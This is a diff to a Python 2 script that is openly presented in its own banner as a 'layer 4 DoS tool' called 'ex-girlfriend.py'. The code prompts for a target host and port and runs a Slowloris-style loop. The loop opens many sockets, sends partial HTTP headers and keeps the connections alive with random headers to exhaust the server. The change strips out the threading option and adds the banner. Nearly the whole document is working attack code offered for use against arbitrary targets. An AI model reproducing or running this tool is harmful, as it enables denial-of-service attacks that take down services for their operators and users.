@@ -321,14 +321,32 @@ ua = [
     "Opera/9.80 (X11; Linux x86_64; U; fr) Presto/2.9.168 Version/11.50",
     "Opera/9.80 (X11; Linux x86_64; U; it) Presto/2.2.15 Version/10.10"
 ]
-import socket, random, threading
-u=raw_input('\n\n      TARGET:\n      (www.example.com or IP)\n\n\n      >')
-p=input('\n      PORT:\n      >')
-b=input('\n      USE THREADS?\n       1-yes\n       2-no\n      >')
-if b==1:
- y=input('\n      THREADS:\n      >')
-else:
- pass
+import socket, random
+print"""\033[92m
+
+  ################################
+  
+  
+     hello there and welcome!!!
+  this is Chaotic Mind's property 
+  so expect an exciting experience 
+  for you with this layer 4 DoS 
+  tool.
+  
+  enjoy!!!
+
+  Tool:
+      ex-girlfriend.py
+      
+  Author:
+      Chaotic Mind 
+      
+
+  
+  ################################  """
+
+u=raw_input('\n\n TARGET:\n (www.example.com or IP)\n >')
+p=input('\n PORT:\n >')
 global ls
 ls=[]
 
@@ -341,8 +359,7 @@ def so():
  s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
  return s
 
-def at():
- while True:
+while True:
 			 try:
 				 soc=so()
 				 ls.append(soc)
@@ -353,20 +370,4 @@ def at():
 			   s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
 			  except socket.error as e:
 			   ls.remove(s)
-			 print'    sockets alive:',len(ls)
-			 
-class HTTPThread(threading.Thread):
-	def run(self):
-		try:
-			while True:
-				 at()
-		except Exception, ex:
-			pass
-if b==1:
- for x in range(y):
-  t = HTTPThread()
-  t.start()
-else:
- at()
-
-
+			 print' sockets alive:',len(ls)
